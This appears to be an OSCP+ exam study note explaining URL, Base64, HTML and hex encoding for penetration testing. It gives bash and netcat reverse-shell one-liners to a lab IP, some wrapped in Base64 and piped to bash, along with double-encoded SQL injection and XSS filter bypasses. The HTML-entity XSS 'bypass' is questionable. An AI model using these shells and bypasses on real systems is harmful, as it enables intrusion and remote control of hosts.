## 1. What encoding actually is (no BS)

**Encoding = transforming data into another format so it can be safely transmitted or processed.**

Key point for OSCP+:

> **Encoding is NOT encryption and NOT hashing.**  
> It’s reversible and usually done for **compatibility**, **transport**, or **bypassing filters**.

### Simple analogy

- Original: `id=1 OR 1=1`
    
- Encoded: `%69%64%3D%31%20%4F%52%20%31%3D%31`
    
- Same meaning, different representation.
    

If you can decode it → it’s encoding.

---

## 2. Why encoding matters in pentesting (OSCP mindset)

Encoding shows up **everywhere** during attacks:

| Situation            | Why Encoding Matters             |
| -------------------- | -------------------------------- |
| URL parameters       | Browsers auto-encode             |
| Web filters / WAFs   | Encoding can bypass them         |
| Reverse shells       | Payloads break without encoding  |
| File uploads         | Encoded payloads evade detection |
| SQLi / XSS           | Filters miss encoded attacks     |
| Passwords in transit | Often Base64 (weak!)             |

If you ignore encoding, **your payloads silently fail**.

---

# Encoding — OSCP+ Level Explanation (with Practical Use)## 3. Common encodings you MUST know for OSCP+

### 3.1 URL Encoding (Percent Encoding)

#### What it is

Converts unsafe characters into `%HEX`

|Character|Encoded|
|---|---|
|space|`%20`|
|`=`|`%3D`|
|`'`|`%27`|
|`"`|`%22`|
|`<`|`%3C`|

#### Practical OSCP example (SQLi filter bypass)

Blocked payload:

```
?id=1 OR 1=1
```

Encoded payload:

```
?id=1%20OR%201%3D1
```

Double-encoded (stronger bypass):

```
?id=1%2520OR%25201%253D1
```

Why it works:

- Some filters decode **once**
    
- App decodes **twice**
    
- Filter misses it → SQL executes
    

💡 OSCP LOVES double encoding tricks.

---

### 3.2 Base64 Encoding (VERY IMPORTANT)

#### What it is

Binary → ASCII encoding  
Often misused as “security” (it isn’t).

Example:

```
admin:password
```

Base64:

```
YWRtaW46cGFzc3dvcmQ=
```

#### OSCP+ real-world use cases

### 🔴 Case 1: HTTP Authorization header

```
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```

Decode it:

```
admin:password
```

👉 Instant creds.

---

### 🔴 Case 2: Reverse shell payloads

Bad (breaks):

```bash
bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
```

Good (Base64 encoded):

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQ== | base64 -d | bash
```

Why OSCP expects this:

- Avoids special character issues
    
- Works in restricted shells
    
- Bypasses weak filters
    

---

### 3.3 HTML Encoding (XSS bypass)

|Character|Encoded|
|---|---|
|`<`|`&lt;`|
|`>`|`&gt;`|
|`"`|`&quot;`|

#### XSS example

Blocked:

```html
<script>alert(1)</script>
```

Bypass:

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

Or mixed encoding:

```html
<scr&#x69;pt>alert(1)</scr&#x69;pt>
```

OSCP tip:

> **Mix encodings** — filters usually fail at combinations.

---

### 3.4 Hex Encoding

Each character → hex value

Example:

```
id=1
```

Hex:

```
69 64 3d 31
```

Used in:

- SQL injection
    
- Binary payloads
    
- Obfuscated commands
    

SQLi example:

```sql
SELECT 0x61646d696e;
```

→ `admin`

---

## 4. Encoding vs Encryption vs Hashing (OSCP exam trap)

|Type|Reversible|Purpose|
|---|---|---|
|Encoding|✅ Yes|Data transport|
|Encryption|✅ Yes (with key)|Confidentiality|
|Hashing|❌ No|Integrity / passwords|

If you see **Base64 passwords** → 🔥 jackpot.

---

## 5. Real OSCP-style attack chain using encoding

### Scenario

- Web app blocks `; | &`
    
- You want RCE
    

### Step 1: Encode payload

```bash
nc -e /bin/bash 10.10.14.3 4444
```

Base64 encode:

```bash
bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjMgNDQ0NA==
```

### Step 2: Execute safely

```bash
echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjMgNDQ0NA== | base64 -d | bash
```

🎯 Shell pops. OSCP-approved technique.

---

## 6. Tools you’ll use nonstop

```bash
# Base64
echo test | base64
echo dGVzdA== | base64 -d

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('id=1 OR 1=1'))"

# CyberChef
Decode / Encode EVERYTHING

# Burp Suite
Decoder tab = your best friend
```

---

## 7. OSCP+ exam mindset (important)

Examiners expect you to:

- Recognize encoded data instantly
    
- Decode creds without hesitation
    
- Encode payloads when commands fail
    
- Use double/mixed encoding for bypass
    

If something _should_ work but doesn’t →  
👉 **Try encoding before giving up**

---